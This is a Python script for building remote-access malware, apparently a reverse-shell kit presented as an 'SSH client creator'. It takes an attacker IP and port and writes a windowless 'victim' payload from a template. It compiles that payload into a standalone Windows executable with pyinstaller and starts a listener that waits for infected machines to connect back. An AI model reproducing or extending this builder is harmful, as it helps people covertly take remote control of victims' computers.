import os
from utils import ServerApp
from formater import sample


start_msg = """
SSH CLIENT CREATOR

WAITING TO THE CONNECTIONS ON:
    HOST:   {}
    PORT:   {}
[1]     TO CHANGE PARAMS
[2]     TO CREATE NEW EXE FILE (pyinstaller is required)
[3]     TO CONNECT

[0]     TO EXIT
"""

HOST = '127.0.0.1'
PORT = 4079

def change_params():
    global HOST, PORT
    host = input("ENTER YOUR IP: ")
    port = input("ENTER PORT (>7000 recommended): ")
    try:
        port = int(port)
    except ValueError:
        print("PORT MUST BE INT")
        change_params()
    HOST = host
    PORT = port
    start()


def create_exe():
    home = os.getcwd()
    try:
        print('TRYING TO INSTALL pyinstaller')
        os.system('pip install pyinstaller')
        print("SUCCESS")
    except:
        print("ERROR")
    filename = input("ENTER FILENAME:")
    with open(f'VICTIM/{filename}.pyw', 'w') as file:
        file.write(sample['victim'].format(HOST, PORT))
    os.chdir('VICTIM')
    os.system(f'pyinstaller --onefile {filename}.pyw')
    os.chdir('dist')
    os.replace(f'{filename}.exe', home)
    os.chdir(home)
    print("CREATED")
    start()


def connect():
    connection = ServerApp(HOST, PORT)
    connection.mainloop()
    start()


def start():
    print(start_msg.format(HOST, PORT))
    answer = input("-->")
    if answer == '1':
        change_params()
    elif answer == '2':
        create_exe()
    elif answer == '3':
        connect()
    elif answer == '0':
        exit()
    else:
        print("ERROR! UNKNOWN PARAMETER...")
        start()


if __name__ == '__main__':
    start()
